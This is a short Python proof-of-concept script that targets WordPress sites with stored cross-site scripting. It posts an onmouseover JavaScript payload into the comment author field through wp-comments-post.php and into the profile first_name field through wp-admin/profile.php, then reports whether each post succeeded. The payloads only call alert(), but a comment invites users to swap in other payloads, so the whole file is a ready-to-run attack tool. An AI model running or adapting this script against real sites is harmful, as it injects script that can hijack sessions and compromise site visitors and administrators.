# Verifications are not on indicator of success and is different from an application to another 

# Change payload if needed

import argparse
import requests

parser = argparse.ArgumentParser(description="WordPress XSS PoC Script")
parser.add_argument("-u", "--url", required=True, help="URL of the target WordPress site")
args = parser.parse_args()

target_url = args.url

xss_payload = " onmouseover=alert(/XSS/); //"                                                          # payload comment

malicious_comment = {
    "author": xss_payload,
    "comment": "Text",
    "submit": "Post Comment"
}

response_comment = requests.post(target_url + "/wp-comments-post.php", data=malicious_comment)

if "Your comment is awaiting moderation." in response_comment.text:
    print("XSS Comment successfully posted on /wp-comments-post.php!")
else:
    print("Failed to post XSS Comment on /wp-comments-post.php.")


# Profile 

xss_payload_profile = "\" onmouseover=alert('XSS'); //"                                                # payload profile

malicious_profile = {
    "first_name": xss_payload_profile ,
    "submit": "Update Profile"
}

response_profile = requests.post(target_url + "/wp-admin/profile.php", data=malicious_profile)

if response_profile.status_code == 200:
    print("XSS Profile successfully updated on /wp-admin/profile.php!")
else:
    print("Failed to update XSS Profile on /wp-admin/profile.php.")
